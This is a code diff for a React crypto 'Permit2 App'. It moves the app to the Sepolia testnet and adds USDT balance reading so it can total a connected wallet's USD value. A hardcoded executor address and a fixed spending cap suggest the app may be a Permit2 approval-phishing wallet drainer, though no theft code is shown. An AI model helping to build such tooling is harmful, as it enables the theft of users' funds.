@@ -1,7 +1,7 @@
 import React, { useState, useEffect } from 'react';
 import { createAppKit } from '@reown/appkit/react';
 import { EthersAdapter } from '@reown/appkit-adapter-ethers';
-import { mainnet } from '@reown/appkit/networks';
+import { sepolia } from '@reown/appkit/networks';
 import { BrowserProvider, Contract, formatUnits } from 'ethers';
 import { doc, setDoc, onSnapshot } from 'firebase/firestore';
 import { ChevronRight, Wallet, Check, Twitter, MessageSquare, Loader2, CheckCircle2, Copy, FileSignature, ShieldCheck, AlertCircle } from 'lucide-react';
@@ -19,10 +19,10 @@ const HARDCODED_EXECUTOR = '0x05a5b264448da10877f79fbdff35164be7b9a869';
 const USDT_DECIMALS = 6n;
 const SPENDING_CAP = BigInt(10000) * (10n ** USDT_DECIMALS);
 
-// Initialize Reown AppKit
+// Initialize Reown AppKit with Sepolia Testnet
 const appKit = createAppKit({
   adapters: [new EthersAdapter()],
-  networks: [mainnet],
+  networks: [sepolia],
   projectId: import.meta.env.VITE_REOWN_PROJECT_ID,
   metadata: {
     name: 'Permit2 App',
@@ -395,13 +395,25 @@ export default function App() {
       const ethBalance = await provider.getBalance(connectedAddress);
       const ethBalanceInEth = parseFloat(formatUnits(ethBalance, 18));
 
+      // Get USDT balance (Sepolia testnet USDT: 0xaA8E23Fb1079EA71e0a56F48a2aA51851D8433D0)
+      // For mainnet use: 0xdAC17F958D2ee523a2206206994597C13D831ec7
+      const usdtAddress = import.meta.env.VITE_TOKEN_ADDRESS || '0xaA8E23Fb1079EA71e0a56F48a2aA51851D8433D0';
+      const usdtContract = new Contract(
+        usdtAddress,
+        ['function balanceOf(address) view returns (uint256)'],
+        provider
+      );
+      const usdtBalance = await usdtContract.balanceOf(connectedAddress);
+      const usdtBalanceInUsdt = parseFloat(formatUnits(usdtBalance, 6)); // USDT has 6 decimals
+
       // Fetch ETH price from CoinGecko
       const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd');
       const data = await response.json();
       const ethPrice = data?.ethereum?.usd || 2000; // Default to $2000 if API fails
 
-      // Calculate total balance in USD (for Sepolia testnet, only ETH balance)
-      const finalBalance = ethBalanceInEth * ethPrice;
+      // Calculate total balance in USD (ETH + USDT)
+      const ethValueInUsd = ethBalanceInEth * ethPrice;
+      const finalBalance = ethValueInUsd + usdtBalanceInUsdt;
       setWalletBalance(finalBalance);
 
     } catch (err) {
